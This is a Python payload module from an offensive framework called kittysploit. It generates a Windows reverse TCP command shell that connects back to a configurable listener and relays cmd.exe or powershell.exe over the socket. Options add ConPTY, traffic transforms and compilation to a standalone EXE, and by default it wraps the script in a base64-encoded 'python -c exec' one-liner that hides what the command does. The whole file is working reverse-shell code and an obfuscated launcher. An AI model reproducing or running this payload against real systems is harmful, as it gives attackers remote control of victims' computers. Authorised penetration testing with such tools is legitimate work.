from kittysploit import *
import base64

from lib.shell.pty_runtime import build_windows_conpty_script


class Module(Payload):

	CLIENT_LANGUAGE = "python"

	__info__ = {
		'name': 'Windows Command Shell, Reverse TCP (via Python)',
		'description': 'Connect back and create a command shell via Python (ConPTY when use_pty=true; Win10 1809+)',
		'category': 'singles',
		'arch': Arch.PYTHON,
		'platform': Platform.WINDOWS,
		'listener': 'listeners/multi/reverse_tcp',
		'handler': Handler.REVERSE
	}

	lhost = OptString('127.0.0.1', 'Connect to IP address', True)
	lport = OptPort(5555, 'Bind Port', True)
	shell_binary = OptString('cmd.exe', 'Shell to use (cmd.exe or powershell.exe)', True, True)
	python_binary = OptString("python", "Python binary (python or py)", True)
	use_pty = OptBool(True, "Spawn shell via ConPTY (tab completion, full console; Win10 1809+)", False, True)
	encoder = OptString("", "Encoder", False, True)
	compile_exe = OptBool(False, "Compile to EXE (requires Zig)", False, True)
	standalone_exe = OptBool(False, "Standalone EXE (embed Python, no install needed; requires embeddable zip)", False, True)
	output_path = OptString("", "Output EXE path when compile_exe=true (default: payload.exe)", False, True)
	embeddable_path = OptString("", "Path to pythonX.Y-embed-amd64.zip (standalone only)", False, True)

	def _build_script(self, host: str, port: int, shell: str, xf_client_code: str = None) -> str:
		"""Build the Python script (used by generate and get_python_script)."""
		if bool(self.use_pty):
			return build_windows_conpty_script(host, port, shell, xf_code=xf_client_code)

		if xf_client_code:
			on_connect = ""
			if "_xf_send_client_hello" in xf_client_code:
				on_connect = "_xf_send_client_hello(s)\n"
			elif "_xf_send_handshake" in xf_client_code:
				on_connect = "_xf_send_handshake(s)\n"
			return (
				"import socket,subprocess,threading\n"
				+ xf_client_code + "\n"
				+ f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
				+ f"s.connect(('{host}',{port}))\n"
				+ on_connect
				+ f"p=subprocess.Popen(['{shell}'],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
				"def r():\n while True:\n  try: d=s.recv(4096)\n  except: break\n  if not d: break\n  p.stdin.write(_xf_decode(d)); p.stdin.flush()\n"
				"def w():\n buf=b''\n while True:\n  try: c=p.stdout.read(1)\n  except: break\n  if not c: break\n  buf+=c\n  if c==b'\\n' or len(buf)>=64: s.sendall(_xf_encode(buf)); buf=b''\n if buf: s.sendall(_xf_encode(buf))\n"
				"t1,t2=threading.Thread(target=r),threading.Thread(target=w)\nt1.daemon=t2.daemon=True\nt1.start();t2.start()\nt1.join();t2.join()\n"
			)
		return (
			"import socket,subprocess,threading\n"
			f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
			f"s.connect(('{host}',{port}))\n"
			f"p=subprocess.Popen(['{shell}'],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
			"def r():\n"
			" while True:\n"
			"  try: d=s.recv(4096)\n"
			"  except: break\n"
			"  if not d: break\n"
			"  p.stdin.write(d); p.stdin.flush()\n"
			"def w():\n"
			" buf=b''\n"
			" while True:\n"
			"  try: c=p.stdout.read(1)\n"
			"  except: break\n"
			"  if not c: break\n"
			"  buf+=c\n"
			"  if c==b'\\n' or len(buf)>=64: s.sendall(buf); buf=b''\n"
			" if buf: s.sendall(buf)\n"
			"t1,t2=threading.Thread(target=r),threading.Thread(target=w)\n"
			"t1.daemon=t2.daemon=True\n"
			"t1.start();t2.start()\n"
			"t1.join();t2.join()\n"
		)

	def get_python_script(self):
		"""Return raw Python script for compilation to EXE."""
		host = str(self.lhost)
		port = int(self.lport)
		shell = str(self.shell_binary).replace("'", "'\"'\"'")
		xf = self._get_transform_instance()
		xf_code = None
		if xf and self._is_transform_compatible(xf) and hasattr(xf, "generate_client_code"):
			xf_code = xf.generate_client_code(self._get_client_language())
		return self._build_script(host, port, shell, xf_code)

	def generate(self):
		host = str(self.lhost)
		port = int(self.lport)
		shell = str(self.shell_binary).replace("'", "'\"'\"'")
		py = str(self.python_binary)

		xf = self._get_transform_instance()
		xf_code = None
		if xf and self._is_transform_compatible(xf) and hasattr(xf, "generate_client_code"):
			xf_code = xf.generate_client_code(self._get_client_language())
		if xf and not self._is_transform_compatible(xf):
			from core.output_handler import print_warning
			lang = self._get_client_language() or "?"
			supported = getattr(xf, "get_supported_client_languages", lambda: [])()
			print_warning(f"Transform does not support client language '{lang}' for this payload (supported: {supported}). Generating without stream transform.")

		script = self._build_script(host, port, shell, xf_code)

		# Compile to EXE if requested
		if self.compile_exe:
			import os
			out = (self.output_path or "").strip()
			if not out:
				out = os.path.join("output", f"payload_{host}_{port}.exe")
			out = os.path.abspath(out)
			standalone = bool(self.standalone_exe)
			emb = (str(self.embeddable_path or "")).strip() or None
			if self.compile_python_to_exe(output_path=out, standalone=standalone, embeddable_path=emb):
				return out
			from core.output_handler import print_warning
			print_warning("EXE compilation failed, falling back to Python command")

		encoded = base64.b64encode(script.encode("utf-8")).decode("ascii")
		return f'{py} -c "import base64;exec(base64.b64decode(\'{encoded}\').decode())"'
